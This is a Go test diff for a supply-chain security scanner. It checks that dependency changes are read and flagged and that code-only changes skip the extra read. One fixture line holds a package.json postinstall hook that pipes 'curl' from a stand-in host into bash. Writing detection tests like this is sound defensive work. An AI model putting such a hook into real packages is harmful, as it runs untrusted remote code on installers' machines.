@@ -16,6 +16,7 @@ import (
 	"github.com/antifailure/antifailure/engine/internal/runtime/local"
 	"github.com/antifailure/antifailure/engine/internal/security"
 	"github.com/antifailure/antifailure/engine/internal/security/ssrf"
+	"github.com/antifailure/antifailure/engine/internal/supply"
 	"github.com/antifailure/antifailure/engine/pkg/edition"
 )
 
@@ -26,8 +27,11 @@ type fakeReader struct {
 	profile        *change.Profile
 	changeErr      error
 	messages       []local.Message
+	depFiles       []change.File
+	depErr         error
 	changed        bool
 	messagesCalled bool
+	depCalled      bool
 }
 
 func (f *fakeReader) Change(context.Context, env.ChangeOptions) (*change.Profile, error) {
@@ -38,6 +42,11 @@ func (f *fakeReader) Change(context.Context, env.ChangeOptions) (*change.Profile
 func (f *fakeReader) Messages(context.Context, int) ([]local.Message, error) {
 	f.messagesCalled = true
 	return f.messages, nil
+}
+
+func (f *fakeReader) DependencyFiles(context.Context, env.ChangeOptions) ([]change.File, error) {
+	f.depCalled = true
+	return f.depFiles, f.depErr
 }
 
 // spyFamily records whether it was probed and what Input it received, and
@@ -336,4 +345,62 @@ func TestSecurityFindings_AFailFindingDrivesTheVerdictAndExitCode(t *testing.T) 
 		"a LevelFail security finding folds into the fail verdict")
 	require.Equal(t, aferrors.ExitVerification, exitCodeOfSilent(t, ciExit(run)),
 		"a proven security finding drives exit 7 through the ordinary gate")
+}
+
+func dependencyProfile() *change.Profile {
+	return &change.Profile{
+		Files: 1,
+		Facts: []change.Fact{
+			{Path: "package.json", Surface: change.SurfaceDependency,
+				Rule: "path.dependency", Evidence: "it is a package manifest"},
+		},
+	}
+}
+
+// The supply_chain wiring, end to end through the collector: a dependency
+// change routes the family, the collector reads the dependency diff and hands
+// it the added lines, and the family's finding comes back in the security
+// namespace. This is the whole point of the lane, proven without an
+// environment.
+func TestSecurityFindings_SupplyChainReadsTheDependencyDiff(t *testing.T) {
+	reg := security.NewRegistry()
+	reg.Register(supply.New())
+	run := report.Run{URL: "http://twin.local"}
+	reader := &fakeReader{
+		profile: dependencyProfile(),
+		depFiles: []change.File{{
+			Path: "package.json", Status: change.StatusModified,
+			AddedLines: []change.AddedLine{
+				{N: 12, Text: `    "postinstall": "curl https://example.test/i.sh | bash",`},
+			},
+		}},
+	}
+
+	got := securityFindings(context.Background(), testEnv(), reader,
+		reg, report.Configure(nil), &run, nil, "")
+
+	require.True(t, reader.depCalled, "the collector must read the dependency diff for a dependency change")
+	require.NotEmpty(t, got, "the added install hook and download must produce findings")
+	fams := map[string]bool{}
+	for _, f := range got {
+		require.Equal(t, "supply_chain", security.FamilyOf(f.Rule))
+		fams[f.Rule] = true
+	}
+	require.True(t, fams["security.supply_chain.install_script_added"], "the added postinstall hook")
+	require.True(t, fams["security.supply_chain.binary_download_in_install"], "the curl piped to a shell")
+}
+
+// A code-only change routes no supply family, so the collector must NOT read
+// the dependency diff a second time. This is the negative that keeps the extra
+// read off the common path.
+func TestSecurityFindings_CodeOnlyChangeDoesNotReadTheDependencyDiff(t *testing.T) {
+	reg := security.NewRegistry()
+	reg.Register(supply.New())
+	run := report.Run{URL: "http://twin.local"}
+	reader := &fakeReader{profile: codeProfile()}
+
+	securityFindings(context.Background(), testEnv(), reader,
+		reg, report.Configure(nil), &run, nil, "")
+
+	require.False(t, reader.depCalled, "a code-only change must not trigger a dependency-diff read")
 }
